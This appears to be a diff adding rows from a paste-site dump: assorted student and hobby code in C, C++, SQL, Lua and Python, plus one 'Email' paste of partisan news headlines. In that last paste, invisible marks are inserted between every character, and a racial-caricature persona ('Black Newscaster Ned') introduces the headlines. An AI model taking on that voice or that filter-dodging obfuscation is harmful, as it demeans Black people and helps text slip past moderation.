+int main() {
+	const auto W{ 5 };
+	const auto K{ 6 };
+	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK
+
+	srand(time(nullptr));
+	// wypełnienie tablicy:
+	for (auto i{ 0 }; i < W; ++i) {
+		for (auto j{ 0 }; j < K; ++j) {
+			tablica[i][j] = 1 + rand() % 30;
+		}
+	}
+
+	return 0;
+}"
+rCJBekWJ,Pandey20,wkblack,SQL,Thursday 4th of April 2024 10:34:21 AM CDT,"SELECT
+  s.z, s.ra, s.dec,
+  p.petroMag_r AS pMag_r, p.extinction_r, p2.KcorrR, em.ebmv, 
+  (p.petroMag_u - p.petroMag_r) - (p.extinction_u - p.extinction_r) AS ur_color,
+  (p.petroMag_g - p.petroMag_r) - (p.extinction_g - p.extinction_r) AS gr_color,
+  sm.logMass AS lmass, sm.ssfr
+FROM 
+  specobj AS s
+  JOIN photoobj AS p ON s.specobjID = p.specobjID
+  JOIN photoz AS p2 ON p.objID = p2.objID
+  JOIN stellarMassFSPSGranWideDust AS sm ON s.specobjID = sm.specobjID
+  JOIN emissionLinesPort AS em ON s.specobjID = em.specobjID
+WHERE
+  s.class = 'galaxy'
+  AND s.zwarning = 0
+  AND s.z BETWEEN 0 AND 0.3
+  AND s.ra BETWEEN 125 AND 235
+  AND s.dec BETWEEN 0 AND 60
+  AND sm.ssfr != -9999
+  AND sm.logMass != -9999"
+kMe1U5R8,asn,Voxel3042,Lua,Thursday 4th of April 2024 10:29:35 AM CDT,"local asn = {
+    __chests   = { peripheral.find(""minecraft:chest"") },
+    chest_list = {},
+    names_list = {}
+}
+local inventory = {}
+function inventory:pull(slot)
+    self.chest.pushItems(peripheral.getName(asn.main), slot)
+    self:update()
+    draw()
+end
+
+function inventory:push(slot)
+    asn.main.pushItems(peripheral.getName(self.chest), slot)
+    self:update()
+    draw()
+end
+
+function inventory:new(chest)
+    local new = {}
+    new.chest = chest
+    return setmetatable(new, {__index=self})
+end
+
+function inventory:update()
+    self.inventory = {}
+    for slot, item in pairs(self.chest.list()) do
+        if self.inventory[item.name] == nil then self.inventory[item.name] = {} end
+        table.insert(self.inventory[item.name], {slot=slot, item=item})
+    end
+end
+
+function inventory:exist(item_id)
+    if self.inventory == nil          then return false end
+    if self.inventory[item_id] == nil then return false end
+    return true
+end
+
+function inventory:free_capacity()
+    local fr = 54
+    for name, info in pairs(self.inventory) do
+        for k, v in pairs(info) do
+            fr = fr - 1
+        end
+    end
+    return fr
+end
+
+function asn:init(main_chest)
+    if main_chest == nil then error(""'main_chest' is nil"") end
+    if type(main_chest) ~= ""string"" then error(""'main_chest' not string"") end
+
+    for index, chest in pairs(self.__chests) do
+        if peripheral.getName(chest) == main_chest then
+            self.main = chest
+            table.remove(self.__chests, index)
+            break
+        end
+    end
+
+    if self.main == nil then
+        print(""all chests in network:"")
+        for k, v in pairs(self.__chests) do
+            print(peripheral.getName(v))
+        end
+        print(""your chest ID: "" .. main_chest)
+        error(""'main_chest' ID not valid"") 
+    end
+
+    for index, chest in pairs(self.__chests) do
+        local inv = inventory:new(chest)
+        inv:update()
+        table.insert(self.chest_list, inv)
+    end
+end
+
+function asn:pull(item_id)
+    local target_chest
+    for index, inv in pairs(self.chest_list) do
+        if inv:exist(item_id) then
+            target_chest = inv
+            break
+        end
+    end
+
+    if target_chest == nil then return end
+
+    local inv = target_chest.inventory[item_id]
+    target_chest:pull( inv[#inv].slot )
+end
+
+function asn:push()
+    local inv = inventory:new(self.main)
+    inv:update()
+    inv.counter = 0
+    
+    for index, invent in pairs(self.chest_list) do
+        ::new_cycle::
+        inv:update()
+        local cap = inv:free_capacity()
+        if cap >= 54 then break end
+
+        for i = 1, invent:free_capacity() do
+            inv.counter = inv.counter + 1
+            invent:push(inv.counter)
+            if inv.counter >= 54 then break end
+            if inv.counter >= (54 - cap) then goto new_cycle end
+        end
+    end
+end
+
+function asn:sum(item_id)
+    local sum = 0
+    for index, inv in pairs(self.chest_list) do
+        if inv:exist(item_id) then
+            for k, v in pairs(inv.inventory[item_id]) do
+                sum = sum + v.item.count
+            end
+        end
+    end
+    return sum
+end
+
+function asn:data()
+    local names = {}
+    for index, inv in pairs(self.chest_list) do
+        for name, _ in pairs(inv.inventory) do
+            names[name] = self:sum(name)
+        end
+    end
+    return names
+end
+
+local mon = peripheral.wrap(""monitor_4"")
+local mon2 = peripheral.wrap(""monitor_5"")
+do
+    mon2.clear()
+    local text = ""DROP""
+    local w,h = mon2.getSize()
+    mon2.setCursorPos((w/2) -  (#text/3), h/2 + 1)
+    mon2.write(text)
+end
+local w, h = mon.getSize()
+local btns = {}
+mon.clear()
+mon.setTextScale(0.5)
+
+function draw()
+    mon.setBackgroundColor(colors.black)
+    for i = 1, h do
+        mon.write(("" ""):rep(w))
+        mon.setCursorPos(1, i)
+    end
+    local y = 1
+    btns = {}
+    for name, count in pairs(asn:data()) do
+        mon.setCursorPos(1, y)
+        mon.setBackgroundColor(y % 2 == 0 and colors.gray or colors.lightGray)
+        mon.write(("" ""):rep(w))
+        mon.setCursorPos(1, y)
+        mon.write(name)
+        mon.setCursorPos(w-4, y)
+        mon.write(count)
+        btns[y] = name
+        y = y + 1
+    end
+end
+
+asn:init(""minecraft:chest_64"")
+asn:push()
+--for i = 1, 1 do
+--   asn:pull(""minecraft:iron_ingot"")
+--end
+draw()
+
+while true do
+    local event, side, x, y = os.pullEvent(""monitor_touch"")
+    if side == ""monitor_4"" then
+        if btns[y] ~= nil then
+            asn:pull(btns[y])
+            draw()
+        end
+    end
+    if side == ""monitor_5"" then
+        asn:push()
+        draw()
+    end
+end"
+S1AbX3Y9,Untitled,geopapram,T-SQL,Thursday 4th of April 2024 10:17:09 AM CDT,"SELECT ProductId, Name, value FROM Product CROSS APPLY STRING_SPLIT(Tags, ','); "
+69GCvRu6,бинарный поиск,nq1s788,Python,Thursday 4th of April 2024 10:16:45 AM CDT,"a = list(map(int, input().split()))
+n = len(a)
+x = int(input()) #найти индекс первого >= x
+l = -1 #не подходят
+r = n #подходят
+while r - l > 1:
+    m = (l + r) // 2
+    if a[m] >= x:
+        r = m
+    else:
+        l = m
+print(r)"
+mURrW4bQ,Indicatore Lowest Low Session,Maurizio-Ciullo,JavaScript,Thursday 4th of April 2024 10:15:49 AM CDT,"// Attenzione Preso Dal Forum Qta Da Macrco Baruzzi, Da Testare Realmente
+// Facendo Anche Un PLot !!!.
+
+inputs:
+	SL(125);
+	
+var:
+    lowestLow(0), // Lowest low during London session
+    buyLimitPrice(0); // Price for buy limit order
+
+// Calculate the lowest low during the London session
+if (Time >= 700 and Time < 1500) then
+    lowestLow = Lowest(low, (1500 - 700 + 100)/100);
+
+// Wait for the New York session to start
+if (Time >= 1200) then
+    buyLimitPrice = lowestLow; // Set buy limit price
+
+// Place a buy limit order
+if (Time >= 1200 and Time < 2000) then
+    Buy(""BuyLimit"") next bar at buyLimitPrice limit;
+
+// Close the trade at the end of the New York session
+if (Time >= 2000) then
+    Sell(""CloseTrade"") next bar at market;
+
+setstoploss_pt(SL);"
+MUeNwggk,SGS assignment 4 for Abdul,tampurus,MySQL,Thursday 4th of April 2024 10:09:57 AM CDT,"-- ASSIGNMENT 4
+create database gourav_ass_4;
+use gourav_ass_4;
+CREATE TABLE customer(CID INT PRIMARY KEY,CNAME VARCHAR(30));
+
+CREATE TABLE BRANCH( BCODE VARCHAR(5) PRIMARY KEY, BNAME VARCHAR(30) );
+
+ALTER TABLE BRANCH ADD CONSTRAINT CPK CHECK (BCODE LIKE 'B');
+CREATE TABLE ACCOUNT(ANO VARCHAR(5) PRIMARY KEY, ATYPE CHAR(2), BALANCE numeric(7), CID int, BCODE VARCHAR(5));
+ALTER TABLE ACCOUNT ADD FOREIGN KEY(CID) REFERENCES CUSTOMER(CID);
+ALTER TABLE ACCOUNT ADD FOREIGN KEY(BCODE) REFERENCES BRANCH(BCODE);
+ALTER TABLE ACCOUNT ADD CONSTRAINT CPK2 CHECK (atype IN('S','C'));
+ALTER TABLE ACCOUNT ADD CONSTRAINT CPK3 CHECK (ano LIKE 'A%');
+
+CREATE TABLE TRANSACTION( TID VARCHAR(5) PRIMARY KEY, 
+ANO VARCHAR(5), TTYPE CHAR(2), TDATE DATE, TAMOUNT INTEGER );
+ALTER TABLE TRANSACTION ADD FOREIGN KEY(ANO) REFERENCES ACCOUNT(ANO);
+ALTER TABLE TRANSACTION ADD CONSTRAINT CPK4 CHECK(TTYPE IN('W','D'));
+ALTER TABLE TRANSACTION ADD CONSTRAINT CPK5 CHECK (tid LIKE 'T%');
+
+INSERT INTO customer (CID, CNAME) 
+VALUES
+(10001, 'Gourav Upadhyay'),
+(10002, 'Priya Patel'),
+(10003, 'Rahul Singh'),
+(10004, 'Ananya Sharma'),
+(10005, 'Aarav Gupta'),
+(10006, 'Neha Verma'),
+(10007, 'Vivek Mishra'),
+(10008, 'Kritika Sharma'),
+(10009, 'Sandeep Yadav'),
+(10010, 'Shreya Joshi');
+
+INSERT INTO branch (BCODE, BNAME)
+VALUES
+('B0001', 'Ahmedabad'),
+('B0002', 'Surat'),
+('B0003', 'Vadodara'),
+('B0004', 'Rajkot');
+
+INSERT INTO account (ANO, ATYPE, BALANCE, CID, BCODE)
+VALUES
+('A0001', 'S', 5000, 10001, 'B0001'),
+('A0002', 'S', 7000, 10002, 'B0004'),
+('A0003', 'S', 3000, 10002, 'B0001'),
+('A0004', 'C', 9000, 10004, 'B0001'),
+('A0005', 'S', 6000, 10001, 'B0002'),
+('A0006', 'C', 2000, 10002, 'B0004'),
+('A0007', 'S', 4000, 10007, 'B0004'),
+('A0008', 'C', 8000, 10002, 'B0001'),
+('A0009', 'S', 10000, 10009, 'B0002'),
+('A0010', 'C', 12000, 10010, 'B0004'),
+('A0011', 'S', 15000, 10001, 'B0001'),
+('A0012', 'C', 17000, 10002, 'B0001'),
+('A0013', 'S', 20000, 10003, 'B0002'),
+('A0014', 'S', 22000, 10001, 'B0001'),
+('A0015', 'S', 25000, 10002, 'B0004');
+
+INSERT INTO account (ANO, ATYPE, BALANCE, CID, BCODE)
+VALUES
+('A0016', 'C', 1000, 10001, 'B0001');
+
+
+INSERT INTO transaction (TID, ANO, TTYPE, TDATE, TAMOUNT)
+VALUES
+('T0001', 'A0001', 'W', '2024-03-30', 1000),
+('T0002', 'A0001', 'D', '2024-03-30', 2000),
+('T0003', 'A0001', 'W', '2024-03-30', 1500),
+('T0004', 'A0001', 'D', '2024-03-30', 3000),
+('T0005', 'A0001', 'W', '2024-03-30', 2500),
+('T0006', 'A0001', 'D', '2024-03-30', 4000),
+('T0007', 'A0007', 'W', '2024-03-10', 2000),
+('T0008', 'A0008', 'D', '2024-03-30', 3500),
+('T0009', 'A0009', 'W', '2024-03-30', 3000),
+('T0010', 'A0010', 'D', '2024-03-30', 5000),
+('T0011', 'A0011', 'W', '2024-03-20', 4000),
+('T0012', 'A0012', 'D', '2024-04-30', 6000),
+('T0013', 'A0003', 'W', '2024-04-30', 4500),
+('T0014', 'A0014', 'D', '2024-03-30', 7000),
+('T0015', 'A0015', 'W', '2024-03-30', 5500),
+('T0016', 'A0001', 'D', '2024-06-30', 8000),
+('T0017', 'A0002', 'W', '2024-03-10', 1000),
+('T0018', 'A0003', 'D', '2024-07-20', 2000),
+('T0019', 'A0002', 'W', '2024-03-30', 1500),
+('T0020', 'A0002', 'D', '2024-01-30', 3000),
+('T0021', 'A0002', 'W', '2024-03-30', 2500),
+('T0022', 'A0002', 'D', '2024-01-30', 4000),
+('T0023', 'A0008', 'W', '2024-03-30', 2000),
+('T0024', 'A0009', 'D', '2024-03-30', 3500),
+('T0025', 'A0003', 'W', '2024-03-30', 3000);
+
+-- C
+SELECT *FROM CUSTOMER WHERE CID IN 
+(SELECT A1.CID FROM ACCOUNT A1, ACCOUNT A2 WHERE A1.ATYPE = 'S' AND A2.ATYPE = 'C' AND A1.CID = A2.CID);
+
+SELECT DISTINCT C.Cid, C.Cname  FROM Customer C 
+INNER JOIN Account A ON C.Cid = A.Cid 
+INNER JOIN Account A1 ON C.Cid = A1.Cid 
+WHERE A.Atype = 'S' AND A1.Atype = 'C';
+
+-- D
+SELECT B.BCODE, B.BNAME, COUNT(A.ANO) as No_of_accounts FROM BRANCH B, ACCOUNT A 
+WHERE B.BCODE=A.BCODE GROUP BY B.BCODE;
+
+
+SELECT B.Bcode, B. Bname, COUNT(A. Ano) AS No_of_accounts 
+FROM Branch B 
+JOIN Account A ON B. Bcode=A. Bcode
+GROUP BY B. Bcode, B. Bname;
+
+-- E 
+
+SELECT B.BCODE, B. BNAME, COUNT(A.bcode) AS No_of_Accounts 
+FROM BRANCH B, ACCOUNT A WHERE B.BCODE = A.BCODE 
+GROUP BY B.BCODE, B.BNAME 
+HAVING COUNT(A.bcode) < 
+(SELECT COUNT(a1.ano)/4 FROM account AS a1);
+
+
+SELECT B.Bcode, B. Bname, COUNT(A. Ano) AS No_of_Accounts
+FROM Branch B, Account A WHERE B.Bcode = A.Bcode 
+GROUP BY B.Bcode, B. Bname 
+HAVING COUNT(A. Ano)< 
+(SELECT COUNT(Ano)/(SELECT COUNT(Bcode) FROM Branch) FROM Account);
+
+SELECT B.Bcode, B. Bname, COUNT(A. Ano) AS NoOfAccount 
+FROM Branch B JOIN Account A ON B.Bcode=A.Bcode 
+GROUP BY B. Bcode, B. Bname 
+HAVING COUNT(A. Ano) < 
+(SELECT COUNT(Ano)/ (SELECT COUNT(Bcode) FROM Branch) FROM Account);
+
+-- F 
+SELECT c.cid, c.cname 
+FROM customer c, account a, transaction t
+WHERE c.cid = a.cid AND a.ano = t.ano
+group by t.tdate
+having COUNT(t.tdate) = 3;
+
+SELECT c.cid, c.cname 
+FROM customer c
+JOIN account a ON c.cid = a.cid
+JOIN transaction t ON a.ano = t.ano
+GROUP BY c.cid, c.cname
+HAVING COUNT(t.tdate) = 3;
+
+
+SELECT c.cid, c.cname FROM customer c, account a, transaction t 
+WHERE c.cid = a.cid AND a.ano = t.ano 
+GROUP BY c.cid, c.cname, t.tdate 
+HAVING COUNT(t.tdate) = 3;
+
+
+-- G 
+CREATE VIEW BRANCH_DATA AS SELECT B.BCODE, B.BNAME, COUNT(A.ANO) as No_of_accounts FROM BRANCH B, ACCOUNT A 
+WHERE B.BCODE=A.BCODE GROUP BY B.BCODE;
+
+create view BRANCH_DATA2 AS 
+SELECT B.Bcode, B. Bname, COUNT(A. Ano) AS No_of_accounts 
+FROM Branch B 
+JOIN Account A ON B. Bcode=A. Bcode
+GROUP BY B. Bcode, B. Bname;
+"
+kD7q1Eng,Angle,artmexbet,C,Thursday 4th of April 2024 09:48:46 AM CDT,"#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+#define ROWS 4
+#define COLS 5
+
+void fill_matrix(int array[ROWS][COLS]) {
+    srand(time(NULL));
+    for (int i = 0; i < ROWS; i++) {
+        for (int j = 0; j < COLS; j++) {
+            array[i][j] = 1 + rand() % 3;
+        }
+    }
+}
+
+void print_matrix(int array[ROWS][COLS]){
+    for (int i = 0; i < ROWS; i++){
+        for (int j = 0; j < COLS; j++){
+            printf(""%d "", array[i][j]);
+        }
+        printf(""\n"");
+    }
+}
+
+void find_g(int matrix[ROWS][COLS]){
+    int maxCount = 0;
+    int coords[] = {0, 0, 0, 0, 0, 0};
+    for (int i = 0; i < ROWS; i++){
+        for (int j = 0; j < COLS; j++){
+            // Вот отсюда можно выкинуть вычисление уголочка из этой точки в отдельный поток
+            int k = 0;
+            int lengthOfHorizontal = 0; // Сюда сохраняем длину повторящихся символов в строке
+            while (j + k < COLS && matrix[i][j + k] == matrix[i][j]){
+                lengthOfHorizontal++;
+                // Или вот отсюда можно запускать потоки, проверяющие вертикальные линии на совпадение с элементом matrix[i][j]
+                // Нижний цикл выкинуть в отдельный поток
+                int l = 0;
+                int lengthOfVertical = 0; // Сюда сохраняем длину повторяющихся символов в столбце
+                while (i + l < ROWS && matrix[i + l][j + k] == matrix[i][j + k]){
+                    lengthOfVertical++;
+                    l++;
+                }
+                if (lengthOfHorizontal + lengthOfVertical > maxCount){
+                    coords[0] = i;
+                    coords[1] = j;
+                    coords[2] = i;
+                    coords[3] = j + k;
+                    coords[4] = i + l - 1;
+                    coords[5] = j + k;
+                    maxCount = lengthOfHorizontal + lengthOfVertical;
+//                    coords = {i, j, i, j + k, i + l - 1, j + k};
+                }
+                k++;
+            }
+        }
+    }
+    for (int i = 0; i < 6; i++){
+        printf(""%d "", coords[i]);
+    }
+}
+
+int main() {
+//    printf(""Hello, World!\n"");
+    int arr[ROWS][COLS] = {{0, 2, 0, 2, 0},
+                           {0, 1, 1, 1, 0},
+                           {2, 0, 2, 1, 1},
+                           {0, 2, 0, 1, 1}};
+//    fill_matrix(arr);
+    print_matrix(arr);
+    find_g(arr);
+    return 0;
+}
+"
+r03fNXua,Поезда Py,SillyWolfy,Python,Thursday 4th of April 2024 09:04:44 AM CDT,"import os
+import platform
+import random
+
+
+class GuessGame:
+    def __init__(self):
+        self.counter = 6
+        self.original_place = random.randint(1, 54)
+        self.current_place = self.original_place
+
+    def clear_screen(self):
+        """"""Очищает консоль в зависимости от операционной системы.""""""
+        os_type = platform.system()
+        if os_type == ""Windows"":
+            os.system('cls')
+        else:
+            os.system('clear')
+
+    def _validate_input(self, number, index_char):
+        """"""Проверяет корректность ввода пользователя.""""""
+        if number < -54 or number > 54:
+            return False
+        if self.counter <= 1:
+            return False
+        return True
+
+    def make_guess(self, number, index_char):
+        """"""Обрабатывает попытку угадывания пользователя.""""""
+        if not self._validate_input(number, index_char):
+            return self.counter, ""WA""
+
+        self.counter -= 1
+
+        if index_char == '!':
+            return (self.counter, ""OK"") if number == self.original_place else (self.counter, ""WA"")
+        elif index_char == '?':
+            self.current_place += number
+            if 1 <= self.current_place <= 54:
+                char_string = ""low"" if self.current_place % 2 != 0 else ""high""
+                char_string += "" side"" if self.current_place >= 37 else "" main""
+                return self.counter, char_string
+            else:
+                return self.counter, ""WA""
+
+    def play(self):
+        """"""Запускает игровой процесс.""""""
+        status = """"
+        while self.counter > 0 and status not in [""OK"", ""WA""]:
+            print(f""Было загадано число: {self.original_place}"") # Строка для тестирования
+            print(f""Текущее место: {self.current_place}"") # Строка для тестирования
+            print(f""У вас осталось {self.counter} попыток"")
+            try:
+                a = input(""Введите символ ('!' или '?'): "")
+                b = int(input(""Введите число: ""))
+            except ValueError:
+                print(""Некорректный ввод. Попробуйте снова."")
+                continue
+
+            _, status = self.make_guess(b, a)
+            print(f""Ответ сервера: {status}"")
+            input(""Нажмите Enter, чтобы продолжить..."")
+            self.clear_screen()
+
+
+if __name__ == ""__main__"":
+    game = GuessGame()
+    game.play()
+"
+mapv09XA,McRonalds Live shift updator,ur9rgi,Lua,Thursday 4th of April 2024 09:03:17 AM CDT,"local frame = script.Parent.SurfaceGui.Trainings.ScrollingFrame
+
+-- Destroy all children of the frame
+for _, child in ipairs(frame:GetChildren()) do
+	child:Destroy()
+end
+local Template = script.Parent.SurfaceGui.Trainings.Template
+local clonedTemplate = Template:Clone()  -- Clone the template
+clonedTemplate.Parent = script.Parent.SurfaceGui.Trainings.ScrollingFrame  -- Set the parent of the clone
+clonedTemplate.Visible = true
+clonedTemplate.Info.Host.Text:Destroy()"
+M0kRd79r,News April4 24,Newscaster_Ned,Email,Thursday 4th of April 2024 08:51:07 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎
+
+Y‎o‎ ‎y‎o‎ ‎y‎o‎,‎ ‎y‎a‎l‎l‎z‎.‎ ‎I‎t‎'‎s‎ ‎m‎e‎ ‎B‎l‎a‎c‎k‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎,‎ ‎y‎'‎a‎l‎l‎!‎ ‎T‎i‎m‎e‎ ‎f‎o‎ ‎d‎a‎t‎ ‎n‎e‎w‎z‎.‎
+
+W‎a‎t‎c‎h‎:‎ ‎J‎i‎m‎m‎y‎ ‎K‎i‎m‎m‎e‎l‎ ‎S‎t‎r‎u‎g‎g‎l‎e‎s‎ ‎t‎o‎ ‎U‎n‎d‎e‎r‎s‎t‎a‎n‎d‎ ‎T‎r‎u‎m‎p‎ ‎T‎r‎o‎u‎n‎c‎i‎n‎g‎ ‎B‎i‎d‎e‎n‎ ‎i‎n‎ ‎P‎o‎l‎l‎s‎
+M‎e‎x‎i‎c‎o‎ ‎A‎g‎g‎r‎e‎s‎s‎i‎v‎e‎l‎y‎ ‎R‎o‎u‎n‎d‎i‎n‎g‎ ‎U‎p‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎A‎p‎p‎r‎o‎a‎c‎h‎i‎n‎g‎ ‎T‎e‎x‎a‎s‎ ‎B‎o‎r‎d‎e‎r‎
+I‎s‎r‎a‎e‎l‎:‎ ‎W‎e‎ ‎W‎i‎l‎l‎ ‎E‎n‎t‎e‎r‎ ‎R‎a‎f‎a‎h‎ ‎a‎n‎d‎ ‎'‎A‎c‎h‎i‎e‎v‎e‎ ‎T‎o‎t‎a‎l‎ ‎V‎i‎c‎t‎o‎r‎y‎'‎
+I‎n‎d‎i‎g‎e‎n‎o‎u‎s‎ ‎L‎e‎a‎d‎e‎r‎s‎ ‎S‎i‎g‎n‎ ‎T‎r‎e‎a‎t‎y‎ ‎G‎r‎a‎n‎t‎i‎n‎g‎ ‎W‎h‎a‎l‎e‎s‎ ‎L‎e‎g‎a‎l‎ ‎P‎e‎r‎s‎o‎n‎h‎o‎o‎d‎
+D‎a‎v‎i‎d‎ ‎C‎a‎m‎e‎r‎o‎n‎ ‎S‎a‎y‎s‎ ‎N‎o‎ ‎B‎o‎o‎t‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎G‎r‎o‎u‎n‎d‎ ‎i‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎,‎
+'‎C‎i‎v‎i‎l‎ ‎W‎a‎r‎'‎ ‎S‎t‎a‎r‎ ‎K‎i‎r‎s‎t‎e‎n‎ ‎D‎u‎n‎s‎t‎ ‎B‎l‎a‎s‎t‎s‎ ‎N‎e‎w‎s‎ ‎M‎e‎d‎i‎a‎
+T‎r‎a‎n‎s‎ ‎H‎a‎r‎v‎a‎r‎d‎ ‎P‎r‎o‎f‎e‎s‎s‎o‎r‎ ‎B‎o‎a‎s‎t‎s‎ ‎A‎b‎o‎u‎t‎ ‎T‎a‎y‎l‎o‎r‎ ‎S‎w‎i‎f‎t‎ ‎C‎o‎u‎r‎s‎e‎:‎ ‎'‎I‎t‎'‎s‎ ‎H‎e‎r‎ ‎W‎o‎r‎l‎d‎'‎
+W‎W‎I‎I‎I‎ ‎W‎a‎t‎c‎h‎:‎ ‎E‎s‎t‎o‎n‎i‎a‎ ‎P‎M‎ ‎C‎a‎l‎l‎s‎ ‎o‎n‎ ‎U‎K‎ ‎t‎o‎ ‎I‎n‎t‎r‎o‎d‎u‎c‎e‎ ‎C‎o‎n‎s‎c‎r‎i‎p‎t‎i‎o‎n‎
+B‎o‎l‎i‎v‎i‎a‎n‎s‎ ‎W‎i‎t‎h‎ ‎'‎V‎i‎s‎a‎ ‎P‎r‎o‎b‎l‎e‎m‎s‎'‎ ‎S‎t‎r‎a‎n‎d‎s‎ ‎C‎r‎u‎i‎s‎e‎ ‎S‎h‎i‎p‎
+U‎n‎e‎m‎p‎l‎o‎y‎e‎d‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎W‎r‎i‎t‎e‎r‎s‎ ‎R‎e‎s‎o‎r‎t‎i‎n‎g‎ ‎t‎o‎ ‎B‎a‎r‎t‎e‎n‎d‎i‎n‎g‎,‎ ‎D‎o‎o‎r‎d‎a‎s‎h‎ ‎G‎i‎g‎s‎
+G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
+H‎o‎m‎e‎P‎a‎g‎e‎
+N‎a‎t‎i‎o‎n‎w‎i‎d‎e‎ ‎G‎a‎s‎ ‎P‎r‎i‎c‎e‎s‎ ‎T‎o‎p‎ ‎$‎3‎.‎5‎0‎,‎ ‎S‎p‎i‎k‎i‎n‎g‎ ‎M‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎4‎5‎%‎ ‎U‎n‎d‎e‎r‎ ‎B‎i‎d‎e‎n‎
+
+A‎n‎d‎ ‎N‎o‎w‎ ‎J‎o‎e‎ ‎H‎a‎s‎ ‎N‎o‎ ‎S‎t‎r‎a‎t‎e‎g‎i‎c‎ ‎R‎e‎s‎e‎r‎v‎e‎ ‎t‎o‎ ‎D‎u‎m‎p‎ ‎o‎n‎ ‎M‎a‎r‎k‎e‎t‎!‎
+j‎o‎e‎ ‎b‎i‎d‎e‎n‎
+T‎h‎e‎ ‎n‎a‎t‎i‎o‎n‎w‎i‎d‎e‎ ‎a‎v‎e‎r‎a‎g‎e‎ ‎p‎r‎i‎c‎e‎ ‎f‎o‎r‎ ‎r‎e‎g‎u‎l‎a‎r‎ ‎g‎a‎s‎ ‎t‎o‎p‎p‎e‎d‎ ‎$‎3‎.‎5‎4‎ ‎a‎ ‎g‎a‎l‎l‎o‎n‎,‎ ‎a‎ ‎s‎p‎i‎k‎e‎ ‎o‎f‎ ‎m‎o‎r‎e‎ ‎t‎h‎a‎n‎ ‎4‎5‎ ‎p‎e‎r‎c‎e‎n‎t‎ ‎u‎n‎d‎e‎r‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎,‎ ‎A‎A‎A‎ ‎r‎e‎p‎o‎r‎t‎e‎d‎ ‎W‎e‎d‎n‎e‎s‎d‎a‎y‎.‎
+
+F‎m‎r‎ ‎O‎b‎a‎m‎a‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎ ‎M‎a‎n‎a‎g‎e‎r‎ ‎M‎e‎s‎s‎i‎n‎a‎:‎ ‎G‎O‎P‎ ‎‘‎C‎h‎a‎n‎g‎i‎n‎g‎ ‎t‎h‎e‎ ‎R‎u‎l‎e‎s‎’‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎d‎d‎l‎e‎ ‎o‎f‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎
+F‎m‎r‎ ‎O‎b‎a‎m‎a‎ ‎C‎a‎m‎p‎a‎i‎g‎n‎ ‎M‎a‎n‎a‎g‎e‎r‎ ‎M‎e‎s‎s‎i‎n‎a‎:‎ ‎G‎O‎P‎ ‎'‎C‎h‎a‎n‎g‎i‎n‎g‎ ‎t‎h‎e‎ ‎R‎u‎l‎e‎s‎'‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎d‎d‎l‎e‎
+2‎,‎8‎9‎3‎
+N‎A‎T‎O‎ ‎i‎s‎ ‎7‎5‎ ‎Y‎e‎a‎r‎s‎ ‎O‎l‎d‎ ‎T‎o‎d‎a‎y‎
+N‎A‎T‎O‎ ‎i‎s‎ ‎7‎5‎ ‎T‎o‎d‎a‎y‎
+6‎6‎
+R‎F‎K‎ ‎J‎r‎.‎ ‎S‎a‎y‎s‎ ‎B‎i‎d‎e‎n‎ ‎‘‎M‎u‎c‎h‎ ‎W‎o‎r‎s‎e‎ ‎T‎h‎r‎e‎a‎t‎ ‎t‎o‎ ‎D‎e‎m‎o‎c‎r‎a‎c‎y‎’‎ ‎T‎h‎a‎n‎ ‎T‎r‎u‎m‎p‎
+R‎F‎K‎ ‎J‎r‎.‎ ‎S‎a‎y‎s‎ ‎B‎i‎d‎e‎n‎ ‎'‎M‎u‎c‎h‎ ‎W‎o‎r‎s‎e‎ ‎T‎h‎r‎e‎a‎t‎ ‎t‎o‎ ‎D‎e‎m‎o‎c‎r‎a‎c‎y‎'‎ ‎T‎h‎a‎n‎ ‎T‎r‎u‎m‎p‎
+4‎,‎3‎8‎6‎
+‘‎C‎i‎v‎i‎l‎ ‎W‎a‎r‎’‎ ‎S‎t‎a‎r‎ ‎K‎i‎r‎s‎t‎e‎n‎ ‎D‎u‎n‎s‎t‎ ‎B‎l‎a‎s‎t‎s‎ ‎N‎e‎w‎s‎ ‎M‎e‎d‎i‎a‎ ‎a‎s‎ ‎‘‎B‎i‎g‎ ‎T‎i‎m‎e‎’‎ ‎D‎r‎i‎v‎e‎r‎ ‎o‎f‎ ‎D‎i‎
+'‎C‎i‎v‎i‎l‎ ‎W‎a‎r‎'‎ ‎S‎t‎a‎r‎ ‎K‎i‎r‎s‎t‎e‎n‎ ‎D‎u‎n‎s‎t‎ ‎B‎l‎a‎s‎t‎s‎ ‎N‎e‎w‎s‎ ‎M‎e‎d‎i‎a‎
+1‎0‎7‎
